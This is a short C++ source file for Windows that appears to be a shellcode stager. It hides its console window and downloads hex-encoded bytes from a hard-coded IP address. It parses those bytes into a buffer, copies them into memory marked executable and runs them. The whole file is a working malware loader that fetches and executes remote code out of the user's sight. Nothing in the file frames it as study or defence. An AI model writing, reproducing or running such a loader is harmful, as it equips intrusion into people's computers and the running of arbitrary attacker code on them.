#include <iostream>
#include <cpr/cpr.h>
#include <windows.h>

int main() {

    ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // SW_SHOW;
    
    cpr::Response r = cpr::Get(cpr::Url{ "http://192.168.29.208/home" });
    char* memBuffer = NULL;
    memBuffer = (char *)r.text.c_str();

    unsigned char shellcode[382]; // This is the size of shellcode
    memBuffer += 2;
    for (size_t count = 0; count < sizeof shellcode - 1; count++) {
        sscanf_s(memBuffer, "%02hhx", &shellcode[count]);
        memBuffer = memBuffer + 4;
    }

    void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();
}
